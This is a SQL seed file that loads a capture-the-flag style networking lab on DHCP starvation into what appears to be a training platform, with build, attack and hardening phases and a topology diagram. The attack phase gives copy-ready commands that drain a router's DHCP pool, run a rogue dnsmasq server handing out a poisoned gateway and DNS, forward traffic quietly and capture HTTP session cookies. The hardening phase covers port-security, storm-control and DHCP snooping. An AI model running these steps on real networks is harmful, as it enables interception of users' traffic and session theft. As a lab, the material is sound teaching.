-- ═══════════════════════════════════════════════════════
-- Lab 08 (id=8) — DHCP Starvation : full content (Vol 2 · Ch 4)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Configure a DHCP server then starve the pool and deploy a rogue DHCP server.',
    topic = 'services',
    difficulty = 'easy',
    book_ref = 'Vol 2 · Ch 4'
WHERE id = 8;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Stand Up the DHCP Server',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Build</span><h3>A working DHCP service to subvert</h3></div>
    <p class="goal">R1 leases VLAN 10 addresses with itself as gateway. Take one clean lease so you know exactly what "correct" looks like before you corrupt it.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> DHCP pool on R1</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> ip dhcp excluded-address 10.0.10.1 10.0.10.9
<span class="prompt">R1(config)#</span> ip dhcp pool VLAN10
<span class="prompt">R1(dhcp-config)#</span> network 10.0.10.0 255.255.255.0
<span class="prompt">R1(dhcp-config)#</span> default-router 10.0.10.1
<span class="prompt">R1(dhcp-config)#</span> lease 0 2</pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Record the correct lease</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">PC-A></span> show ip
<span class="cmt">GATEWAY : 10.0.10.1     ← the correct answer. Remember it.</span></pre>
    </div>
  </div>

  <!-- ATTACK -->
$md$
WHERE lab_id = 8 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Starve and Replace',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Attack</span><h3>Starve, then impersonate</h3></div>
    <p class="goal">Stage one exhausts R1's pool so it can't answer. Stage two puts Kali's own DHCP server on the wire with a poisoned gateway.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Starvation — drain the pool</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ dhcpstarv -i eth0</span>   <span class="cmt"># or: yersinia -I → DHCP → sending DISCOVER</span>

<span class="prompt">R1#</span> show ip dhcp binding | count
<span class="cmt">Number of lines which match regexp = <b>244</b>   ← pool exhausted</span></pre>
      <div class="note watch"><strong>Confirm exhaustion:</strong> once bindings fill the /24, a genuinely new client gets no OFFER from R1. The field is clear for you.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Rogue server + forwarding</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> cat &gt; /etc/dnsmasq-rogue.conf &lt;&lt;'EOF'
interface=eth0
dhcp-range=10.0.10.100,10.0.10.200,2m
dhcp-option=3,10.0.10.66     <span class="cmt"># default gateway → Kali</span>
dhcp-option=6,10.0.10.66     <span class="cmt"># DNS → Kali</span>
EOF
<span class="attackline">kali$ dnsmasq -C /etc/dnsmasq-rogue.conf -d</span>
<span class="prompt">kali$</span> sysctl -w net.ipv4.ip_forward=1   <span class="cmt"># stay invisible: forward victims onward</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Client boots into the trap → capture</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">PC-B></span> show ip
<span class="cmt">GATEWAY : <b>10.0.10.66</b>   ← that's Kali</span>

<span class="prompt">kali$</span> tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie
<span class="cmt">SESSION=NB8-r0gu3-dhcp-4c71</span></pre>
    </div>
    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Capture the token from a victim whose gateway is now Kali.</h4>
      <div class="flag-row"><input id="flag-in" placeholder="NB8-..."><button onclick="checkFlag()">Submit</button></div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>
    <details class="hint"><summary>Hint 1 — R1 keeps answering, my OFFER loses</summary>
      <p>Starvation isn't complete — R1 still has free addresses and its OFFER competes with yours. Confirm with <code>show ip dhcp binding</code>. A rogue server without a drained pool is just gambling on winning the race; silence R1 first. That dependency (starve <em>then</em> serve) is the whole lab.</p></details>
    <details class="hint"><summary>Hint 2 — victim has Kali as gateway but no internet</summary>
      <p>You forgot <code>ip_forward=1</code> (and a path to the real R1). Without it you're a black hole, not a MITM, and the victim notices instantly. A clean gateway impersonation forwards traffic on so the victim's experience is normal while you read it all.</p></details>
  </div>

  <!-- HARDEN -->
$md$
WHERE lab_id = 8 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Harden the Pool',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Harden</span><h3>Bound the flood — and meet the limit</h3></div>
    <p class="goal">Without DHCP snooping (that's Lab 37), your levers here are switchport-level: cap how many MACs a port may present, and rate-limit the broadcast storm the starvation tool generates.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Port-security bounds the starvation</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">SW1(config)#</span> interface range e0/1 - 3
<span class="prompt">SW1(config-if-range)#</span> switchport port-security
<span class="prompt">SW1(config-if-range)#</span> switchport port-security maximum 2
<span class="prompt">SW1(config-if-range)#</span> switchport port-security violation restrict
<span class="prompt">SW1(config-if-range)#</span> storm-control broadcast level pps 100</pre>
      <div class="note why"><strong>Why it dents the attack:</strong> <code>dhcpstarv</code> spoofs a fresh source MAC per DISCOVER. Port-security caps MACs-per-port, so the flood trips the violation and the frames are dropped — R1's pool survives, and it keeps answering legitimately.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-attack the starvation → blunted</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ dhcpstarv -i eth0</span>

<span class="prompt">SW1#</span> show port-security interface e0/3
<span class="cmt">Security Violation Count : 5127   ← flood dropped</span>
<span class="prompt">R1#</span> show ip dhcp binding | count
<span class="cmt">... = 3   ← pool intact. Starvation defeated.</span></pre>
    </div>

    <div class="cliff">
      <h4>⚠ …but the rogue server walks right through this</h4>
      <p>A rogue DHCP server needs exactly <em>one</em> MAC — Kali's own — so port-security never trips on it. With starvation blocked the real server is alive again, which demotes the rogue from a guaranteed win to an unreliable race — but a fast rogue can still beat R1 and poison a client. Prove it: leave port-security on, start <code>dnsmasq</code>, boot a client a few times, and watch one occasionally land <code>GATEWAY : 10.0.10.66</code>. You cannot fully close this at the switchport layer. The control that drops a rogue OFFER outright — regardless of any race — is <strong>DHCP snooping, Lab 37</strong>.</p>
    </div>
  </div>
$md$
WHERE lab_id = 8 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  8,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router as gateway and DHCP server, a switch, two clients, and a Kali attacker running a rogue DHCP server">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway + DHCP · 10.0.10.1</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2 · VLAN 10</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="245" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">e0/0 · uplink</text>
      <line x1="330" y1="80" x2="160" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="365" y1="80" x2="365" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="400" y1="80" x2="575" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="255" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <text x="372" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/2</text>
      <text x="475" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3</text>
      <rect x="100" y="230" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="160" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="160" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">DHCP client</text>
      <rect x="305" y="230" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="365" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="365" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">boots mid-attack</text>
      <rect x="515" y="230" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="575" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="575" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">rogue DHCP · .66</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">two moves: drain R1's pool, then answer in its place</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 320" role="img" aria-label="Router as gateway and DHCP server, a switch, two clients, and a Kali attacker running a rogue DHCP server">
      <rect x="40" y="30" width="150" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="115" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="115" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">gateway + DHCP · 10.0.10.1</text>
      <rect x="300" y="30" width="130" height="50" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="52" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">SW1</text>
      <text x="365" y="68" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">IOU L2 · VLAN 10</text>
      <line x1="190" y1="55" x2="300" y2="55" stroke="#2563eb" stroke-width="2"/>
      <text x="245" y="46" text-anchor="middle" font-family="monospace" font-size="9" fill="#16a34a">e0/0 · uplink</text>
      <line x1="330" y1="80" x2="160" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="365" y1="80" x2="365" y2="230" stroke="#2563eb" stroke-width="2"/>
      <line x1="400" y1="80" x2="575" y2="230" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="255" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/1</text>
      <text x="372" y="160" font-family="monospace" font-size="9" fill="#64748b">e0/2</text>
      <text x="475" y="160" font-family="monospace" font-size="9" fill="#e5484d">e0/3</text>
      <rect x="100" y="230" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="160" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-A</text>
      <text x="160" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">DHCP client</text>
      <rect x="305" y="230" width="120" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="365" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">PC-B</text>
      <text x="365" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">boots mid-attack</text>
      <rect x="515" y="230" width="120" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="575" y="252" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="575" y="268" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">rogue DHCP · .66</text>
      <text x="360" y="308" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">two moves: drain R1's pool, then answer in its place</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
